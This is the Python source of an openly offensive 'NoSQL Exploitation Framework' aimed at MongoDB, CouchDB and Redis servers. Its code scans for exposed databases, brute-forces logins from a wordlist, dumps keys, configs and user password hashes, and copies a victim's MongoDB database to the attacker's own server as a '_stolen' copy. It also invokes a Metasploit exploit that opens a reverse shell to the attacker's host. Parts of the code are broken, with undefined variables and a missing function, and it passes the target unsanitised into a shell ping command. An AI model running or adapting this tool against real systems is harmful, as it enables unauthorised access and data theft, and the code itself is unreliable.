#!/usr/bin/python
#NoSQL Exploitation FrameWork Copyright 2013 Francis Alexander
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

import requests
import socket
import sys
import string
import random
import os
import time
import httplib2
import urllib
import pymongo
from pymongo import Connection
import subprocess
import couchdb
import redis
from termcolor import colored
import argparse
import dump
from shodan import WebAPI
global target
target =""
global port
def main():
	parser = argparse.ArgumentParser(description='Python Nosql Exploitation Framework')
	parser.add_argument('-ip','--ip', help='Host to Scan', required=True)
	parser.add_argument('-port','--port', help='Port', required=False)
	parser.add_argument('-scan', '--scan',help='Scan', required=False, action='store_true')
	parser.add_argument('-enum','--enum', help='Enum DBs ==> mongo,couch,redis', required=False)
	parser.add_argument('-brute','--brute', help='Brute Force ==> mongo', required=False)
	parser.add_argument('-file','--file', help='Brute Force file name', required=False)
	parser.add_argument('-clone','--clone', help="Clone's DB", required=False)
	args = vars(parser.parse_args())
	target = args['ip']
	port = args['port']
	host_up(target)
	if args['scan']:
		scan_db(target)
	if args['clone'] == 'couch':
		clone_couch(target)
	if args['brute'] == "mongo":
		if port:
			pass
		else:
			port = 27017
		file_name = args['file']
		brute_mongo(file_name,target,port)
	elif args['brute'] == "couch":
		if port:
			pass
		else:
			port = 5984
		file_name = args['file']
		brute_couch(file_name,target,port)
	elif args['brute'] == "redis":
		if port:
			pass
		else:
			port = 6379
		file_name = args['file']
		brute_redis(file_name,target,port)
	if args['enum'] == 'mongo':
		if port:
			pass
		else:
			port = 27017
		conn=mongo_conn(target,port)
		mongo_web(target)
		mongo_enum(conn)
	if args['enum'] == 'couch':
		couch=couch_conn(target)
		couch_enum(couch)
	if args['enum'] == 'redis':
		r_server=redis_conn(target)
		redis_enum(r_server)
	
def clone_couch(target):
	if not os.path.exists("dump"):
    		os.makedirs("dump")
	elif not os.path.exists("dump/couchdb"):
   		 os.makedirs("dump/couchdb")
	print colored("[-] Clone Module For NoSQL Framework Launched ..",'blue')
	couch = couch_conn(target)
	for db in couch:
		print colored("[-]%s"%(db),'green')
	print colored('[-] Enter Database to clone','blue')
	try:
		db_clone = raw_input()
		file = open("./dump/couchdb/"+str(target)+"."+db_clone+".dump","w")
		dump.dump_db("http://"+target+":5984/"+db_clone,output=file)
		print colored("[-] Cloning Succesfull with DB %s"%db_clone,'green')
	except couchdb.http.ResourceNotFound:
		print colored("[-] Plse Check DB Name '%s' not in List"%db_clone,'red')
def brute_mongo(file_name,target,port):
	print colored("[-] Bruteforcing Module For NoSQL Framework Launched ..",'blue')
	conn = mongo_conn(target,port)
	db = conn['admin']
	try:
		file = open(file_name,"r")
		lines = file.read().split('\n')
		for names in lines:
			try:
				db.authenticate(names.split(':')[0],names.split(':')[1])
				print colored("[-] Auth Succeeded with username:%s and Password %s"%(names.split(':')[0],names.split(':')[1]),'green')	
				break
			except pymongo.errors.OperationFailure:
				print colored("[-] Auth Failed with username:%s and Password %s"%(names.split(':')[0],names.split(':')[1]),'red')
	except Exception,e:
		print colored(str(e),'red')
		
def brute_couch(file_name,target,port):
	print colored("[-] Bruteforcing Module For NoSQL Framework Launched ..",'blue')
	url = "http://"+target+":"+str(port)+"/_session"
	try:
		file = open(file_name,"r")
		lines = file.read().split('\n')
		for names in lines:
				payload={'name':str(names.split(':')[0]),'password':str(names.split(':')[1])}
				code = requests.post(url,data=payload)
				if code.status_code == 200:
					print colored("[-] Auth Succeeded with username:%s and Password %s"%(names.split(':')[0],names.split(':')[1]),'green')	
					break
				else:
					print colored("[-] Auth Failed with username:%s and Password %s"%(names.split(':')[0],names.split(':')[1]),'red')
	except Exception,e:
		print colored(str(e),'red')	

def brute_redis(file_name,target,port):
	print colored("[-] Bruteforcing Module For NoSQL Framework Launched ..",'blue')
	r_server = redis_connb(target,port)
	try:
		file = open(file_name,"r")
		lines = file.read().split('\n')
		for names in lines:
			try:
				r_server.execute_command('AUTH',names.split(':')[1])
				print colored("[-] Auth Succeeded with Password %s"%(names.split(':')[1]),'green')	
				break
			except redis.exceptions.ResponseError:
				print colored("[-] Auth Failed with Password %s"%(names.split(':')[1]),'red')
	except Exception,e:
		print colored(str(e),'red')
	

def host_up(target):#Checks Whether the Host is Up or Not
	response = os.system("ping -c 1 -w2 " + target + " > /dev/null 2>&1")
	if response == 0:
		return True 
	else:
		print colored("\n[-]"+target+' is down! or Invalid Host Address\n','red')
		print "[-] Exiting.. "
		sys.exit()

def mongo_conn(target,port):
	try:
		conn = Connection(target,int(port))
		popen = "[-] MongoDB port open on " + target + ":27017!"
		#print popen
		return conn
	except :
		#print colored(str(e),'red')
		print colored("[-] MongoDB port closed. \n",'red')
		sys.exit()
def couch_conn(target):
	try:
		couch = couchdb.Server('http://%s:5984/'%(target))
		check = couch.version()# Makes sure that the Connection is really established
		return couch
	except socket.error:
		print colored("[-] CouchDB port closed. \n",'red')
		sys.exit()
def redis_conn(target,port):
	try:
		r_server = redis.Redis(target,port)
		check = r_server.keys() # Makes sure that the Connection is really established
		popen = "[-] RedisDB port open on " + target + ":6379! \n"
		return r_server
	except redis.exceptions.ConnectionError:
		print colored("[-] RedisDB Port Closed \n",'red')
		sys.exit()
def redis_connb(target,port):
	try:
		r_server = redis.Redis(target,port)
		#check = r_server.keys() # Makes sure that the Connection is really established
		popen = "[-] RedisDB port open on " + target + ":6379! \n"
		return r_server
	except redis.exceptions.ConnectionError:
		print colored("[-] RedisDB Port Closed \n",'red')
		sys.exit()



def scan_db(target):
	mong = False
	cou = False
	red = False

	print colored("\n[!] Scanning Module For NoSQL Framework Launched..... \n",'green')
	time.sleep(2)

	try:
		conn = Connection(target,27017)
		popen = "[-] MongoDB port open on " + target + ":27017!\n"
		print colored(popen,'green')
		mong= True
	except:
		print colored("[-] MongoDB port closed. \n",'red')
		

	try:
		couch = couchdb.Server('http://%s:5984/'%(target))
		check = couch.version()# Makes sure that the Connection is really established
		popen = "[-] CouchDB port open on " + target + ":5984!\n"
		print colored(popen,'green')
		cou = True
	except socket.error:
		print colored("[-] CouchDB port closed. \n",'red')

	try:
		r_server = redis.Redis(target)
		check = r_server.keys() # Makes sure that the Connection is really established
		popen = "[-] RedisDB port open on " + target + ":6479! \n"
		print colored(popen,'green')
                red = True
	except redis.exceptions.ConnectionError:
		
		print colored("[-] RedisDB Port Closed \n",'red')
	except redis.exceptions.ResponseError:
		popen = "[-] RedisDB port open on " + target + ":6479! \n"
		print colored(popen,'green')		

	
	if red ==  False and cou == False and mong == False:
		print colored("No DB Ports Open ",'red')


def couch_enum(couch):
	further = True
	print colored("\n[!] Enumeration Module For NoSQL Framework Couchdb Launched.....",'yellow')
	try:
		print colored("\n[!] Enumerating DB's \n",'blue')
		for db in couch:
			print colored("[-]%s"%(db),'green')
			time.sleep(2)
	except couchdb.http.Unauthorized:
		print colored("[-] The DB requires Credentials or Wrong Credentials :( \n",'red')
		further = False
	if further != False:
		print colored("\n\n[!] Trying to Retrieve CouchDB Configs\n",'green') #Parsing needed to be added
		try:
			for i in couch.config():
				print colored(i,'green')
		except couchdb.http.Unauthorized:
			print colored("[-] Oops Looks Like u need Credentials \n",'red')

def redis_enum(r_server):
	print colored("\n[!] Enumeration Module For NoSQL Framework Redisdb Launched.....",'yellow')
	print colored("\n[!] Enumerating Redis Keys \n",'blue')
	for i in r_server.keys():
		print colored("[-]"+i,'green')
	print colored("\n[!] Geting Key Details \n",'blue')
	for i in r_server.keys():
		print colored("'%s'"%i+":"+r_server.get(i)+"\n",'green') 
def mongo_web(target):
	try:
		url = 'http://'+target+':28017'
		code = requests.get(url)
		if code.status_code == 200:
			print colored("MongoDB web management open at " + url + ".  No authentication required!",'blue')
	except Exception,e: 
		print str(e)

	
def mongo_enum(conn):
		further = True
		print "Server Info:"
		serverInfo = conn.server_info()
		for keys in serverInfo:
			print colored("[-]"+(keys)+":"+str(serverInfo[keys]),'green')
		print "\n"
		
		try:
			print colored("List of databases:",'blue')
			dbList = conn.database_names()
			for i in dbList:
				print colored("[-]"+i,'green')
			print "\n"
			
		except:
			print colored("Error:  Couldn't list databases.  The provided credentials may not have rights.",'red')
			further = False
		print colored("List of collections:",'blue')
		#print "\n"
		
		try:
			for dbItem in dbList:
				db = conn[dbItem]
				colls = db.collection_names()
				print dbItem + ":"
				for i in colls:
					print colored("[-]"+i,'green')
				if 'system.users' in colls:
					users = list(db.system.users.find())
					print colored("Database Users and Password Hashes:",'blue')
					#print dbItem
					print colored("[-]"+str(users),'green')
			#print "\n"
		except pymongo.errors.AutoReconnect:
			print colored("Looks Like Slaveok is Set to False\n ",'red')
			print colored("[-] Renabling with slaveok= true",'green')
			#db.slave_okay=True
			for dbItem in dbList:
				db = conn[dbItem]
				db.slave_okay=True
				colls = db.collection_names()
				print dbItem + ":"
				print "\n[-]".join(colls)
				if 'system.users' in colls:
					users = list(db.system.users.find())
					print "[!] Database Users and Password Hashes:"
					#print dbItem
					print str(users)

		
		except:
			print colored("Error:  Couldn't list collections.  The provided credentials may not have rights.",'red')
		
		if further != False:
	
			stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
			
			if stealDB.lower() == "y":
				myip = raw_input('Enter your ip address')
				stealDBs (myip)
				getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
		
				if getShell == "y" or getShell == "Y":
					#Launch Metasploit exploit
					try:
						proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
			
					except:
						print colored("Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined.",'red')
		
def stealDBs(myDB):
	menuItem = 1	
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
		
	try:
		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
		dbNeedCreds = raw_input("Does this database require credentials? ")
		
		if dbNeedCreds == "n" or dbNeedCreds == "N":	
			myDBConn = pymongo.MongoClient(myDB,27017)
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
		
		elif dbNeedCreds == "y" or dbNeedCreds == "Y":
			dbUser = raw_input("Enter database username: ")
			dbPass = raw_input("Enter database password: ")
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
		
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			stealDBs(myDB)
			
		cloneAnother = raw_input("Database cloned.  Copy another?")
		
		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)
		
		else:
			return()
	
	except:
		raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
		mainMenu()	

main()
